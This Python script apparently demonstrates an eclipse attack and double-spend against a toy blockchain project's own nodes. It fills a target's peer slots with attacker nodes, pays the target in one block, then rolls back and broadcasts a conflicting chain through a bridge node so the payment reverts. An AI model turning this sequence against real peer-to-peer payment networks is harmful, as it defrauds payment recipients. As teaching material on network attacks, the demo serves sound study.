"""
Eclipse Attack Demo V2 - Standalone Script
Demonstrating Eclipse Attack with Double-Spending (NEW SCENARIO)

Usage:
    python demo_eclipse_attack_v2.py

New Attack Flow:
1. Create malicious nodes, select target, sync blockchain
2. One bridge node connects to honest network
3. Attacker mines to get funds
4. Create TX1: Attacker → Target (10 coins)
5. Mine TX1 → Broadcast block to Target (Target accepts)
6. Rollback chain, create TX2: Attacker → Malicious node (10 coins)
7. Mine TX2 → Broadcast to honest network via bridge node
8. Target reconnects to honest network → TX1 reverted, TX2 confirmed
"""

import sys
import os
import time
import requests

# Add parent directory to path
sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

from auth.user_manager import UserManager
from network.node import Node
from network.network_manager import NetworkManager
from core.transaction import Transaction
import config


class EclipseAttackDemoV2:
    def __init__(self):
        """Initialize Eclipse Attack Demo V2"""
        self.user_manager = UserManager()
        self.network_manager = NetworkManager()
        self.malicious_nodes = []
        self.malicious_accounts = []
        self.target_node = None
        self.original_peers = {}
        
        print("\n" + "🌑"*40)
        print("ECLIPSE ATTACK DEMONSTRATION V2")
        print("Simulating Real-World Eclipse Attack with Double-Spending")
        print("🌑"*40 + "\n")
    
    def display_network(self):
        """Display current network nodes"""
        nodes = self.network_manager.get_all_nodes()
        
        if not nodes:
            print("❌ No nodes in network!")
            return []
        
        print("\n" + "="*80)
        print("NETWORK NODES")
        print("="*80)
        print(f"{'#':<5} {'Username':<20} {'Node ID':<40} {'URL':<25}")
        print("-"*80)
        
        for i, node in enumerate(nodes, 1):
            node_id = node['node_id'][:8] + "..."
            url = f"http://{node['host']}:{node['port']}"
            username = node.get('username', 'Unknown')
            print(f"{i:<5} {username:<20} {node_id:<40} {url:<25}")
        
        print("="*80)
        return nodes
    
    def create_malicious_accounts(self):
        """Step 1: Create malicious accounts"""
        print("\n" + "="*80)
        print("STEP 1: CREATE MALICIOUS ACCOUNTS")
        print("="*80)
        
        while True:
            try:
                count = int(input("\n💀 Enter number of malicious nodes to create (default 8): ").strip() or "8")
                if count < 3:
                    print("❌ Need at least 3 nodes (attacker, bridge, recipient)!")
                    continue
                if count > 20:
                    print("⚠️ Too many nodes may cause performance issues!")
                    confirm = input("Continue? (yes/no): ").strip().lower()
                    if confirm != 'yes':
                        continue
                break
            except ValueError:
                print("❌ Invalid number!")
        
        print(f"\n🔨 Creating {count} malicious accounts...")
        
        for i in range(count):
            username = f"Malicious_{i+1:03d}"
            password = f"evil_{i+1}"
            
            success, message, blockchain_data = self.user_manager.register(username, password)
            
            if success:
                self.malicious_accounts.append({
                    'username': username,
                    'password': password
                })
                print(f"  ✓ Created: {username}")
            else:
                print(f"  ✗ Failed: {username} - {message}")
        
        print(f"\n✅ Created {len(self.malicious_accounts)} malicious accounts")
        
        if not self.malicious_accounts:
            print("\n❌ Failed to create any accounts!")
            return False
        
        time.sleep(1)
        return True
    
    def start_malicious_nodes(self):
        """Step 2: Start malicious nodes"""
        print("\n" + "="*80)
        print("STEP 2: START MALICIOUS NODES")
        print("="*80)
        
        if not self.malicious_accounts:
            print("\n❌ No malicious accounts to start!")
            return False
        
        print(f"\n🚀 Starting {len(self.malicious_accounts)} malicious nodes...")
        
        for account in self.malicious_accounts:
            username = account['username']
            
            try:
                node = Node(username=username)
                
                account_data = self.user_manager.get_account_data(username)
                if account_data and account_data.get('blockchain'):
                    from core.blockchain import Blockchain
                    node.blockchain = Blockchain.from_list(
                        account_data['blockchain'],
                        owner_address=username
                    )
                
                node.start()
                time.sleep(0.1)
                
                self.network_manager.register_node(
                    node_id=node.node_id,
                    host=node.host,
                    port=node.port,
                    username=username
                )
                
                self.malicious_nodes.append(node)
                print(f"  ✓ Started: {username} @ {node.get_url()}")
                
            except Exception as e:
                print(f"  ✗ Failed: {username} - {str(e)}")
        
        print(f"\n✅ Started {len(self.malicious_nodes)} malicious nodes")
        
        if not self.malicious_nodes:
            print("\n❌ Failed to start any nodes!")
            return False
        
        print("\n🔗 Connecting malicious nodes to each other...")
        for i, node1 in enumerate(self.malicious_nodes):
            for node2 in self.malicious_nodes[i+1:]:
                if len(node1.peers) < config.MAX_PEERS:
                    node1.add_peer(node2.node_id, node2.get_url())
                if len(node2.peers) < config.MAX_PEERS:
                    node2.add_peer(node1.node_id, node1.get_url())
        
        print("✅ Malicious network established")
        time.sleep(1)
        return True
    
    def select_target(self):
        """Step 3: Select target node"""
        print("\n" + "="*80)
        print("STEP 3: SELECT TARGET NODE")
        print("="*80)
        
        all_nodes = self.network_manager.get_all_nodes()
        malicious_usernames = [acc['username'] for acc in self.malicious_accounts]
        
        legitimate_nodes = [
            node for node in all_nodes 
            if node.get('username') not in malicious_usernames
        ]
        
        if not legitimate_nodes:
            print("\n❌ No legitimate nodes in network to attack!")
            return False
        
        print("\n📋 Available legitimate nodes:")
        print(f"{'#':<5} {'Username':<20} {'Node ID':<20} {'URL':<25}")
        print("-"*70)
        
        for i, node in enumerate(legitimate_nodes, 1):
            node_id = node['node_id'][:8] + "..."
            url = f"http://{node['host']}:{node['port']}"
            username = node.get('username', 'Unknown')
            print(f"{i:<5} {username:<20} {node_id:<20} {url:<25}")
        
        while True:
            try:
                choice = input(f"\n🎯 Select target node (1-{len(legitimate_nodes)}): ").strip()
                idx = int(choice) - 1
                
                if 0 <= idx < len(legitimate_nodes):
                    self.target_node = legitimate_nodes[idx]
                    print(f"\n✅ Target selected: {self.target_node.get('username')} @ http://{self.target_node['host']}:{self.target_node['port']}")
                    
                    print(f"\n🔄 Synchronizing malicious nodes with target's blockchain...")
                    
                    if not self.sync_malicious_nodes_with_target():
                        print(f"\n⚠️ Warning: Blockchain sync failed!")
                        confirm = input("Continue anyway? (yes/no): ").strip().lower()
                        if confirm != 'yes':
                            return False
                    
                    return True
                else:
                    print("❌ Invalid choice!")
            except ValueError:
                print("❌ Invalid input!")
            except KeyboardInterrupt:
                print("\n\n❌ Cancelled")
                return False
    
    def sync_malicious_nodes_with_target(self):
        """Sync all malicious nodes with target's blockchain"""
        if not self.target_node or not self.malicious_nodes:
            return False
        
        target_url = f"http://{self.target_node['host']}:{self.target_node['port']}"
        
        try:
            print(f"\n   📥 Fetching target's blockchain...")
            response = requests.get(f"{target_url}/chain", timeout=5)
            
            if response.status_code != 200:
                print(f"   ✗ Failed to get target's chain (HTTP {response.status_code})")
                return False
            
            target_chain_data = response.json()
            target_chain = target_chain_data.get('chain', [])
            
            if not target_chain:
                print(f"   ✗ Target chain is empty!")
                return False
            
            print(f"   ✓ Target chain: {len(target_chain)} blocks")
            
            from core.block import Block
            reconstructed_chain = []
            for block_data in target_chain:
                reconstructed_chain.append(Block.from_dict(block_data))
            
            print(f"\n   🔄 Syncing {len(self.malicious_nodes)} malicious node(s)...")
            synced_count = 0
            
            for mal_node in self.malicious_nodes:
                try:
                    mal_node.blockchain.chain = [block for block in reconstructed_chain]
                    mal_node.blockchain.pending_transactions = []
                    
                    print(f"   ✓ {mal_node.username}: Adopted target's blockchain ({len(reconstructed_chain)} blocks)")
                    synced_count += 1
                    
                except Exception as e:
                    print(f"   ✗ {mal_node.username}: Sync failed - {str(e)}")
            
            if synced_count == 0:
                print(f"\n   ✗ No nodes synced successfully!")
                return False
            
            print(f"\n   ✅ Consensus achieved: {synced_count}/{len(self.malicious_nodes)} node(s) synced")
            print(f"   ✅ All nodes now have identical blockchain!")
            
            return True
            
        except Exception as e:
            print(f"   ✗ Sync failed: {str(e)}")
            return False
    
    def isolate_target(self):
        """Step 4: Isolate target node"""
        print("\n" + "="*80)
        print("STEP 4: ECLIPSE ATTACK - ISOLATE TARGET")
        print("="*80)
        
        target_url = f"http://{self.target_node['host']}:{self.target_node['port']}"
        
        print(f"\n🌑 Eclipsing target: {self.target_node.get('username')}")
        print(f"   URL: {target_url}")
        
        try:
            response = requests.get(f"{target_url}/info", timeout=2)
            if response.status_code == 200:
                info = response.json()
                print(f"\n📊 Target status BEFORE attack:")
                print(f"   Chain length: {info.get('chain_length', 0)}")
                print(f"   Current peers: {info.get('peers_count', 0)}")
        except Exception as e:
            print(f"   ⚠️ Could not get target status: {str(e)}")
        
        print(f"\n🔗 Filling target's connection slots with malicious nodes...")
        print(f"   Target accepts maximum {config.MAX_PEERS} connections")
        
        connected = 0
        
        for mal_node in self.malicious_nodes[:config.MAX_PEERS]:
            try:
                mal_node.add_peer(self.target_node['node_id'], target_url)
                
                response = requests.post(
                    f"{target_url}/add_peer",
                    json={
                        'peer_id': mal_node.node_id,
                        'peer_url': mal_node.get_url()
                    },
                    timeout=2
                )
                
                if response.status_code == 200:
                    connected += 1
                    print(f"   ✓ [{connected}/{config.MAX_PEERS}] Connected: {mal_node.username}")
                
            except Exception as e:
                print(f"   ✗ Failed: {mal_node.username} - {str(e)}")
        
        print(f"\n✅ Eclipse Attack Complete!")
        print(f"   Target surrounded by {connected} malicious node(s)")
        
        if connected == 0:
            print("\n⚠️ WARNING: Failed to connect any malicious nodes to target!")
            return False
        
        time.sleep(1)
        return True
    
    def demonstrate_double_spending(self):
        """Step 5: Demonstrate double-spending attack (NEW SCENARIO)"""
        print("\n" + "="*80)
        print("STEP 5: DOUBLE-SPENDING ATTACK (NEW SCENARIO)")
        print("="*80)
        
        if len(self.malicious_nodes) < 3:
            print("\n⚠️ Need at least 3 malicious nodes!")
            print(f"   Current: {len(self.malicious_nodes)} node(s)")
            return False
        
        # Setup roles
        attacker = self.malicious_nodes[0]
        bridge_node = self.malicious_nodes[1]
        recipient_node = self.malicious_nodes[2]
        
        target_username = self.target_node.get('username')
        target_url = f"http://{self.target_node['host']}:{self.target_node['port']}"
        
        print(f"\n🎭 Attack Roles:")
        print(f"   Attacker (miner): {attacker.username}")
        print(f"   Bridge node (connects to honest network): {bridge_node.username}")
        print(f"   Recipient (receives double-spend): {recipient_node.username}")
        print(f"   Victim (target): {target_username}")
        
        # Step 5.1: Connect bridge node to honest network
        print("\n" + "="*80)
        print("STEP 5.1: CONNECT BRIDGE NODE TO HONEST NETWORK")
        print("="*80)
        
        all_nodes = self.network_manager.get_all_nodes()
        malicious_usernames = [node.username for node in self.malicious_nodes]
        honest_nodes = [
            n for n in all_nodes 
            if n.get('username') not in malicious_usernames 
            and n['node_id'] != self.target_node['node_id']
        ]
        
        print(f"\n🔍 Found {len(honest_nodes)} honest node(s) in network")
        
        if honest_nodes:
            connected_count = 0
            for honest_node in honest_nodes[:3]:
                try:
                    honest_url = f"http://{honest_node['host']}:{honest_node['port']}"
                    bridge_node.add_peer(honest_node['node_id'], honest_url)
                    
                    response = requests.post(
                        f"{honest_url}/add_peer",
                        json={
                            'peer_id': bridge_node.node_id,
                            'peer_url': bridge_node.get_url()
                        },
                        timeout=2
                    )
                    
                    if response.status_code == 200:
                        connected_count += 1
                        print(f"   ✓ Bridge connected to: {honest_node.get('username')}")
                except Exception as e:
                    print(f"   ✗ Failed: {str(e)}")
            
            print(f"\n✅ Bridge node connected to {connected_count} honest node(s)")
        else:
            print(f"\n⚠️ No honest nodes found! Attack will proceed...")
        
        time.sleep(1)
        
        # Step 5.2: Mining phase
        print("\n" + "="*80)
        print("STEP 5.2: MINING PHASE - ATTACKER GETS FUNDS")
        print("="*80)
        
        attacker_balance = attacker.blockchain.get_total_balance(attacker.username)
        confirmed, pending, total = attacker_balance
        print(f"\n💰 Attacker current balance: {confirmed} coins")
        
        if confirmed < 10:
            print(f"\n⛏️ Attacker needs to mine blocks...")
            
            # Calculate blocks needed: ceil((required - current) / reward_per_block)
            import math
            blocks_needed = math.ceil((10 - confirmed) / config.MINING_REWARD)
            
            print(f"\n   🔍 Calculation:")
            print(f"      Need: 10 coins")
            print(f"      Have: {confirmed} coins")
            print(f"      Missing: {10 - confirmed} coins")
            print(f"      Reward per block: {config.MINING_REWARD} coins")
            print(f"      Blocks needed: {blocks_needed}")
            print(f"      Will get: {blocks_needed * config.MINING_REWARD} coins")
            
            for i in range(blocks_needed):
                dummy_tx = Transaction(sender="System", receiver=attacker.username, amount=0)
                attacker.blockchain.add_transaction(dummy_tx)
                
                block = attacker.blockchain.mine_pending_transactions(attacker.username)
                if block:
                    print(f"   ✓ Block #{len(attacker.blockchain.chain)-1} mined (+{config.MINING_REWARD} coins)")
            
            attacker_balance = attacker.blockchain.get_total_balance(attacker.username)
            confirmed, pending, total = attacker_balance
            print(f"\n✅ Mining complete! Balance: {confirmed} coins")
            
            # Sync to all malicious nodes
            print(f"\n   🔄 Syncing blockchain across malicious network...")
            for mal_node in self.malicious_nodes[1:]:
                try:
                    mal_node.blockchain.chain = [block for block in attacker.blockchain.chain]
                    mal_node.blockchain.pending_transactions = []
                except:
                    pass
            
            # Sync to target
            print(f"   🔄 Syncing to target...")
            try:
                chain_data = [block.to_dict() for block in attacker.blockchain.chain]
                response = requests.post(
                    f"{target_url}/chain/replace",
                    json={'chain': chain_data, 'length': len(chain_data), 'force': True},
                    timeout=5
                )
                if response.status_code == 200:
                    print(f"   ✓ Target synced")
            except Exception as e:
                print(f"   ✗ Target sync error: {str(e)}")
        
        time.sleep(1)
        
        # Step 5.3: Transaction 1 to target
        print("\n" + "="*80)
        print("STEP 5.3: TRANSACTION 1 - SEND COINS TO TARGET")
        print("="*80)
        
        try:
            response = requests.get(f"{target_url}/info", timeout=2)
            if response.status_code == 200:
                info = response.json()
                target_initial_balance = info.get('balance', 0)
                print(f"\n💰 Target initial balance: {target_initial_balance} coins")
        except:
            target_initial_balance = 0
        
        print(f"\n📤 Creating transaction: {attacker.username} → {target_username} (10 coins)")
        
        try:
            tx1 = Transaction(sender=attacker.username, receiver=target_username, amount=10)
            
            attacker.blockchain.add_transaction(tx1)
            print(f"   ✓ Transaction created")
            
            print(f"\n⛏️ Mining transaction on attacker's chain...")
            block1 = attacker.blockchain.mine_pending_transactions(attacker.username)
            
            if not block1:
                print(f"   ✗ Mining failed!")
                return False
            
            print(f"   ✓ Block #{len(attacker.blockchain.chain)-1} mined")
            
            # Sync to other malicious nodes
            for mal_node in self.malicious_nodes[1:]:
                try:
                    mal_node.blockchain.chain.append(block1)
                except:
                    pass
            
            # Broadcast to target
            print(f"\n   📡 Broadcasting block to target...")
            response = requests.post(f"{target_url}/block/new", json=block1.to_dict(), timeout=2)
            
            if response.status_code == 200:
                print(f"   ✓ Target accepted block!")
                
                response = requests.get(f"{target_url}/info", timeout=2)
                if response.status_code == 200:
                    info = response.json()
                    target_new_balance = info.get('balance', 0)
                    print(f"   💰 Target balance: {target_initial_balance} → {target_new_balance} coins")
            else:
                print(f"   ✗ Target rejected block!")
                return False
                
        except Exception as e:
            print(f"   ✗ Failed: {str(e)}")
            return False
        
        time.sleep(1)
        
        # Step 5.4: Transaction 2 (double-spend)
        print("\n" + "="*80)
        print("STEP 5.4: TRANSACTION 2 - DOUBLE-SPEND")
        print("="*80)
        
        print(f"\n💀 Creating DOUBLE-SPEND transaction:")
        print(f"   {attacker.username} → {recipient_node.username} (10 coins)")
        print(f"   ⚠️ Using SAME 10 coins sent to {target_username}!")
        
        print(f"\n🔄 Creating alternative blockchain...")
        
        # Rollback
        chain_length_before_tx1 = len(attacker.blockchain.chain) - 1
        rolled_back_block = attacker.blockchain.chain.pop()
        print(f"   ✓ Rolled back block #{chain_length_before_tx1}")
        
        try:
            tx2 = Transaction(sender=attacker.username, receiver=recipient_node.username, amount=10)
            
            attacker.blockchain.add_transaction(tx2)
            print(f"   ✓ Transaction 2 created")
            
            print(f"\n⛏️ Mining transaction 2...")
            block2 = attacker.blockchain.mine_pending_transactions(attacker.username)
            
            if not block2:
                print(f"   ✗ Mining failed!")
                return False
            
            print(f"   ✓ Block #{len(attacker.blockchain.chain)-1} mined")
            
            # Sync to malicious nodes
            print(f"\n   🔄 Syncing alternative chain to malicious network...")
            for mal_node in self.malicious_nodes[1:]:
                try:
                    if len(mal_node.blockchain.chain) > chain_length_before_tx1:
                        mal_node.blockchain.chain = mal_node.blockchain.chain[:chain_length_before_tx1]
                    mal_node.blockchain.chain.append(block2)
                except:
                    pass
            print(f"   ✓ Malicious network synced")
            
        except Exception as e:
            print(f"   ✗ Failed: {str(e)}")
            return False
        
        time.sleep(1)
        
        # Step 5.5: Broadcast to honest network
        print("\n" + "="*80)
        print("STEP 5.5: BROADCAST TO HONEST NETWORK")
        print("="*80)
        
        print(f"\n📡 Bridge node broadcasting to honest network...")
        
        if honest_nodes:
            broadcast_count = 0
            for honest_node in honest_nodes[:3]:
                try:
                    honest_url = f"http://{honest_node['host']}:{honest_node['port']}"
                    chain_data = [block.to_dict() for block in bridge_node.blockchain.chain]
                    response = requests.post(
                        f"{honest_url}/chain/replace",
                        json={'chain': chain_data, 'length': len(chain_data), 'force': False},
                        timeout=2
                    )
                    if response.status_code == 200:
                        broadcast_count += 1
                        print(f"   ✓ Synced to {honest_node.get('username')}")
                except Exception as e:
                    print(f"   ✗ Failed: {str(e)}")
            
            print(f"\n✅ Alternative chain broadcasted to {broadcast_count} honest node(s)")
        else:
            print(f"\n⚠️ No honest nodes - simulating broadcast")
        
        time.sleep(2)
        
        # Step 5.6: Target reconnects
        print("\n" + "="*80)
        print("STEP 5.6: TARGET RECONNECTS TO HONEST NETWORK")
        print("="*80)
        
        print(f"\n🔌 Shutting down malicious nodes...")
        for mal_node in self.malicious_nodes[:config.MAX_PEERS]:
            try:
                mal_url = mal_node.get_url()
                requests.post(f"{mal_url}/shutdown", timeout=1)
                print(f"   ✓ Shutdown: {mal_node.username}")
            except:
                pass
        
        time.sleep(2)
        
        print(f"\n🔄 Target synchronizing with honest network...")
        try:
            response = requests.post(f"{target_url}/sync", timeout=5)
            if response.status_code == 200:
                print(f"   ✓ Sync triggered")
        except:
            pass
        
        time.sleep(2)
        
        # Final result
        print("\n" + "="*80)
        print("ATTACK RESULT")
        print("="*80)
        
        try:
            response = requests.get(f"{target_url}/info", timeout=2)
            if response.status_code == 200:
                info = response.json()
                target_final_balance = info.get('balance', 0)
                
                print(f"\n📊 Final status:")
                print(f"   Target balance: {target_final_balance} coins")
                print(f"   Transaction 1 (to {target_username}): REVERTED ❌")
                print(f"   Transaction 2 (to {recipient_node.username}): CONFIRMED ✅")
                
                print(f"\n💀 Double-spending attack SUCCESS!")
                print(f"\n📝 What happened:")
                print(f"   1. Attacker sent 10 coins to {target_username}")
                print(f"   2. Target accepted and saw +10 coins")
                print(f"   3. Attacker used SAME 10 coins to pay {recipient_node.username}")
                print(f"   4. Honest network accepted alternative transaction")
                print(f"   5. Target reconnected → Lost the 10 coins!")
        except:
            pass
        
        return True
    
    def cleanup(self):
        """Step 6: Cleanup demo"""
        print("\n" + "="*80)
        print("STEP 6: CLEANUP")
        print("="*80)
        
        confirm = input("\n⚠️ Remove all malicious nodes and accounts? (yes/no): ").strip().lower()
        
        if confirm != 'yes':
            print("❌ Cleanup cancelled")
            return
        
        print(f"\n🧹 Cleaning up...")
        
        print(f"\n🛑 Stopping malicious nodes...")
        for node in self.malicious_nodes:
            try:
                self.network_manager.unregister_node(node.node_id)
                node.stop()
                print(f"   ✓ Stopped: {node.username}")
            except Exception as e:
                print(f"   ✗ Error: {str(e)}")
        
        print(f"\n🗑️ Deleting malicious accounts...")
        for account in self.malicious_accounts:
            username = account['username']
            try:
                if self.user_manager.delete_account(username):
                    print(f"   ✓ Deleted: {username}")
                else:
                    print(f"   ⚠️ Not found: {username}")
            except Exception as e:
                print(f"   ✗ Error: {str(e)}")
        
        print(f"\n✅ Cleanup complete!")
    
    def run(self):
        """Run the complete demo"""
        try:
            print("\n📊 Current network status:")
            self.display_network()
            
            input("\nPress Enter to start demo...")
            
            if not self.create_malicious_accounts():
                print("\n❌ Failed to create accounts.")
                return
            
            if not self.start_malicious_nodes():
                print("\n❌ Failed to start nodes.")
                self.cleanup()
                return
            
            if not self.select_target():
                print("\n❌ Demo cancelled")
                self.cleanup()
                return
            
            input("\nPress Enter to continue...")
            
            if not self.isolate_target():
                print("\n❌ Eclipse attack failed")
                self.cleanup()
                return
            
            input("\nPress Enter to demonstrate double-spending...")
            
            if not self.demonstrate_double_spending():
                print("\n❌ Double-spending failed")
                self.cleanup()
                return
            
            self.cleanup()
            
            print("\n" + "="*80)
            print("DEMO COMPLETE")
            print("="*80)
            print("\n✅ Demo finished successfully!")
            
        except KeyboardInterrupt:
            print("\n\n⚠️ Demo interrupted by user")
            self.cleanup()
        except Exception as e:
            print(f"\n❌ Error: {str(e)}")
            import traceback
            traceback.print_exc()
            self.cleanup()


def main():
    """Main function"""
    demo = EclipseAttackDemoV2()
    demo.run()


if __name__ == "__main__":
    main()
